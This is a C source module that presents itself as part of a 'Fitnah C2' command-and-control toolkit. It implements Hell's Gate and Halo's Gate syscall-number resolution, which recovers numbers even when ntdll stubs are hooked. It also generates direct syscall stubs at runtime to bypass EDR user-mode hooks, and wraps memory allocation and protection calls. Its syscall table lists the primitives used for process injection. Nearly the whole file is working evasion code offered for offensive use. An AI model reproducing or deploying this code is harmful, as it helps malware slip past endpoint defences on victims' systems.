/**
 * Advanced Direct NTAPI Syscall Implementation - Fileless Execution Module
 * =========================================================================
 * 
 * Features:
 * - Dynamic syscall number resolution from ntdll.dll
 * - Runtime generation of syscall stubs (x64)
 * - Bypasses EDR user-mode hooks by executing syscalls directly
 * - Version-independent (supports Win7 through Win11)
 * - Anti-analysis: No static syscall instructions in the binary
 * 
 * MITRE: T1106 (Native API)
 * Author: Fitnah C2 Team
 * Version: 2.0.0
 */

#include <windows.h>
#include <winternl.h>
#include <stdio.h>
#include <stdint.h>

// Syscall table structure
typedef struct _SYSCALL_ENTRY {
    LPCSTR Name;
    DWORD Number;
    PVOID StubAddress;
} SYSCALL_ENTRY;

// Global syscall table
static SYSCALL_ENTRY g_SyscallTable[] = {
    {"NtAllocateVirtualMemory", 0, NULL},
    {"NtProtectVirtualMemory", 0, NULL},
    {"NtWriteVirtualMemory", 0, NULL},
    {"NtReadVirtualMemory", 0, NULL},
    {"NtFreeVirtualMemory", 0, NULL},
    {"NtQueryVirtualMemory", 0, NULL},
    {"NtCreateThreadEx", 0, NULL},
    {"NtOpenProcess", 0, NULL},
    {"NtClose", 0, NULL},
    {"NtMapViewOfSection", 0, NULL},
    {"NtUnmapViewOfSection", 0, NULL},
    {"NtCreateSection", 0, NULL},
    {"NtQuerySystemInformation", 0, NULL},
    {NULL, 0, NULL}
};

static BOOL g_Initialized = FALSE;

/**
 * ResolveSyscallNumber - Hell's Gate / Halo's Gate SSN resolution.
 *
 * Hell's Gate: read SSN directly from the stub (works when ntdll is clean).
 * Halo's Gate:  if the stub is hooked (starts with jmp or mov rax),
 *               scan neighboring exports sorted by address to find an
 *               unhooked adjacent stub and derive the SSN by ±offset.
 *
 * Detection heuristic: a hooked stub usually starts with E9 (jmp rel32),
 * FF25 (jmp [rip+x]), or 48B8 (mov rax, imm64) — none of which appear
 * in a clean x64 ntdll prologue (4C8BD1 = mov r10,rcx; B8xx = mov eax,ssn).
 */

/* Compare function for qsort — sort BYTE* pointers by address value */
static int _compare_func_ptrs(const void *a, const void *b) {
    BYTE *pa = *(BYTE **)a;
    BYTE *pb = *(BYTE **)b;
    if (pa < pb) return -1;
    if (pa > pb) return  1;
    return 0;
}

static BOOL _stub_is_hooked(BYTE *p) {
    /* Hooked if first byte is JMP (E9), JMP [mem] (FF 25), or MOV RAX (48 B8) */
    if (p[0] == 0xE9) return TRUE;
    if (p[0] == 0xFF && p[1] == 0x25) return TRUE;
    if (p[0] == 0x48 && p[1] == 0xB8) return TRUE;
    return FALSE;
}

static DWORD _read_ssn_from_stub(BYTE *p) {
    /* Pattern: [4C 8B D1] B8 <ssn:4> ... */
    for (int i = 0; i < 32; i++) {
        if (p[i] == 0xB8)
            return *(DWORD *)(p + i + 1);
    }
    return 0xFFFFFFFF;
}

static DWORD ResolveSyscallNumber(LPCSTR FunctionName) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return 0;

    BYTE *pTarget = (BYTE *)GetProcAddress(hNtdll, FunctionName);
    if (!pTarget) return 0;

    /* ── Hell's Gate: clean stub → read SSN directly ── */
    if (!_stub_is_hooked(pTarget)) {
        DWORD ssn = _read_ssn_from_stub(pTarget);
        if (ssn != 0xFFFFFFFF) return ssn;
    }

    /* ── Halo's Gate: stub is hooked → find SSN via neighbors ── */
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hNtdll;
    PIMAGE_NT_HEADERS pNt  = (PIMAGE_NT_HEADERS)((LPBYTE)hNtdll + pDos->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY pExp = (PIMAGE_EXPORT_DIRECTORY)((LPBYTE)hNtdll +
        pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    DWORD *pFuncs  = (DWORD *)((LPBYTE)hNtdll + pExp->AddressOfFunctions);
    DWORD *pNames  = (DWORD *)((LPBYTE)hNtdll + pExp->AddressOfNames);
    WORD  *pOrds   = (WORD  *)((LPBYTE)hNtdll + pExp->AddressOfNameOrdinals);

    /* Collect all Nt* function pointers into a sortable array */
    #define MAX_NT_EXPORTS 512
    static BYTE *s_sorted[MAX_NT_EXPORTS];
    DWORD count = 0;

    for (DWORD i = 0; i < pExp->NumberOfNames && count < MAX_NT_EXPORTS; i++) {
        LPCSTR name = (LPCSTR)((LPBYTE)hNtdll + pNames[i]);
        if (name[0] == 'N' && name[1] == 't') {
            s_sorted[count++] = (BYTE *)((LPBYTE)hNtdll + pFuncs[pOrds[i]]);
        }
    }

    /* Sort by address — syscall numbers map to address order */
    qsort(s_sorted, count, sizeof(BYTE *), _compare_func_ptrs);

    /* Find pTarget's position; walk ±1, ±2, ±3 until we hit a clean stub */
    int pos = -1;
    for (DWORD i = 0; i < count; i++) {
        if (s_sorted[i] == pTarget) { pos = (int)i; break; }
    }
    if (pos < 0) return 0;

    for (int delta = 1; delta < 10; delta++) {
        /* Check stub above (lower SSN) */
        if (pos - delta >= 0 && !_stub_is_hooked(s_sorted[pos - delta])) {
            DWORD neighbor_ssn = _read_ssn_from_stub(s_sorted[pos - delta]);
            if (neighbor_ssn != 0xFFFFFFFF)
                return neighbor_ssn + delta;
        }
        /* Check stub below (higher SSN) */
        if (pos + delta < (int)count && !_stub_is_hooked(s_sorted[pos + delta])) {
            DWORD neighbor_ssn = _read_ssn_from_stub(s_sorted[pos + delta]);
            if (neighbor_ssn != 0xFFFFFFFF)
                return neighbor_ssn - delta;
        }
    }
    return 0; /* could not resolve */
}

/**
 * CreateSyscallStub - Generate a runtime syscall stub in executable memory
 * 
 * Stub logic (x64):
 *   mov r10, rcx
 *   mov eax, <ssn>
 *   syscall
 *   ret
 */
static PVOID CreateSyscallStub(DWORD SyscallNumber) {
#ifdef _WIN64
    BYTE stub[] = {
        0x4C, 0x8B, 0xD1,               // mov r10, rcx
        0xB8, 0x00, 0x00, 0x00, 0x00,   // mov eax, <ssn>
        0x0F, 0x05,                     // syscall
        0xC3                            // ret
    };
    *(DWORD*)(stub + 4) = SyscallNumber;
#else
    BYTE stub[] = {
        0xB8, 0x00, 0x00, 0x00, 0x00,   // mov eax, <ssn>
        0xBA, 0x00, 0x00, 0x00, 0x00,   // mov edx, <KiFastSystemCall>
        0xFF, 0xD2,                     // call edx
        0xC3                            // ret
    };
    *(DWORD*)(stub + 1) = SyscallNumber;
    // KiFastSystemCall resolution would go here for x86
#endif

    PVOID pStub = VirtualAlloc(NULL, sizeof(stub), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (pStub) {
        memcpy(pStub, stub, sizeof(stub));
        DWORD oldProtect;
        VirtualProtect(pStub, sizeof(stub), PAGE_EXECUTE_READ, &oldProtect);
    }
    return pStub;
}

/**
 * Syscall_Initialize - Initialize the dynamic syscall table
 */
BOOL Syscall_Initialize() {
    if (g_Initialized) return TRUE;

    for (int i = 0; g_SyscallTable[i].Name != NULL; i++) {
        g_SyscallTable[i].Number = ResolveSyscallNumber(g_SyscallTable[i].Name);
        if (g_SyscallTable[i].Number != 0) {
            g_SyscallTable[i].StubAddress = CreateSyscallStub(g_SyscallTable[i].Number);
        }
    }

    g_Initialized = TRUE;
    return TRUE;
}

/**
 * GetSyscallStub - Retrieve a generated stub by name
 */
PVOID GetSyscallStub(LPCSTR FunctionName) {
    if (!g_Initialized) Syscall_Initialize();

    for (int i = 0; g_SyscallTable[i].Name != NULL; i++) {
        if (strcmp(g_SyscallTable[i].Name, FunctionName) == 0) {
            return g_SyscallTable[i].StubAddress;
        }
    }
    return NULL;
}

// ============================================================================
// SYSCALL WRAPPERS
// ============================================================================

typedef NTSTATUS (NTAPI *NtAllocateVirtualMemory_t)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

NTSTATUS Syscall_NtAllocateVirtualMemory(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
) {
    NtAllocateVirtualMemory_t pFunc = (NtAllocateVirtualMemory_t)GetSyscallStub("NtAllocateVirtualMemory");
    if (!pFunc) return STATUS_NOT_SUPPORTED;
    return pFunc(ProcessHandle, BaseAddress, ZeroBits, RegionSize, AllocationType, Protect);
}

typedef NTSTATUS (NTAPI *NtProtectVirtualMemory_t)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect
);

NTSTATUS Syscall_NtProtectVirtualMemory(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect
) {
    NtProtectVirtualMemory_t pFunc = (NtProtectVirtualMemory_t)GetSyscallStub("NtProtectVirtualMemory");
    if (!pFunc) return STATUS_NOT_SUPPORTED;
    return pFunc(ProcessHandle, BaseAddress, RegionSize, NewProtect, OldProtect);
}

// ... Additional wrappers can be implemented here following the same pattern ...

/**
 * Syscall_Cleanup - Free all generated stubs
 */
VOID Syscall_Cleanup() {
    for (int i = 0; g_SyscallTable[i].Name != NULL; i++) {
        if (g_SyscallTable[i].StubAddress) {
            VirtualFree(g_SyscallTable[i].StubAddress, 0, MEM_RELEASE);
            g_SyscallTable[i].StubAddress = NULL;
        }
    }
    g_Initialized = FALSE;
}
